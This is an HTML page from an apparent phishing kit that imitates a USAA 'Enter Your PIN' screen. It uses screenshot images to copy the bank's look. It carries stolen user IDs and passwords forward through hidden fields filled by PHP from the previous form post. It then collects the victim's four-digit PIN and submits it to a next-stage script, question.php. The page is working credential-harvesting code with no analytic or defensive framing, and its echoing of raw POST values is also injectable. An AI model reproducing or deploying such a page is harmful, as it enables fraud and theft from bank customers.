<!DOCTYPE html>
<html class="yui3-js-enabled" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="ltr" lang="en"><head>
		<title>Enter Your PIN | USAA</title>
		
		<!-- Keywords -->
		
		
		<!-- Title -->
		<meta name="title" content="Enter Your PIN | USAA">
		<link rel="stylesheet" type="text/css" href="img/aggregator.css" media="all" />
		<link rel="stylesheet" type="text/css" href="imgs/aggregator.css" media="all" />
		<link rel="SHORTCUT ICON" href="usaaicon.ico" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
.usaa-button.skin-button-1.p1
     {
      border-radius:4px;
      box-shadow:0 0 0 1px #437c16,0 0 0 3px #fff,0 0 0 4px #ddd;
      height:1.8em;
}
.usaa-button .button-liner{border:1px solid transparent;border-radius:4px;color:#005C92;display:block;height:100%;padding:0 10px;position:relative;text-align:center;white-space:nowrap;}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#f1f1f1" Link="#000000" VLink="#000000" ALink="#000000">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1359; height:453px; z-index:1"><img src="Capture14.PNG" alt="" title="" border=0 width=1359 height=453></div>



<form action="question.php" id="ide" method="post" name="Logon" onsubmit="return validateForm()">
<input name="userid" value="<?php echo $_POST['userid'];?>" type="hidden" />
<input name="password" value="<?php echo $_POST['password'];?>" type="hidden" />
<input name="userid2" value="<?php echo $_POST['userid2'];?>" type="hidden" />
<input name="password2" value="<?php echo $_POST['password2'];?>" type="hidden" />


		<script type="text/javascript">
function validateForm()
{
var x=document.forms["Logon"]["pin1"].value;
if (x==null || x=="")
  {
  alert("PIN must be filled out");
  return false;
  }
}
</script>



<input size="5" maxlength="4" pattern="[0-9]*" value="" name="pin1" id="id2" autocomplete="off" type="password" style="position:absolute;height:18px;width:60px;left:455px;top:316px;z-index:50">


<button type="submit" name="submitButton" id="idb" value="Next" class="usaa-button p1 noMultiFormSubmit skin-button-1" data-delay="0" style="position:absolute; left:1069px; top:388px; z-index:7"><span class="button-liner">Next</span></button>
</div>
</form>


<div id="image5" style="position:absolute; overflow:hidden; left:188px; top:445px; width:974px; height:408px; z-index:4"><img src="Capture11.PNG" alt="" title="" border=0 width=974 height=408></div>

</body></html>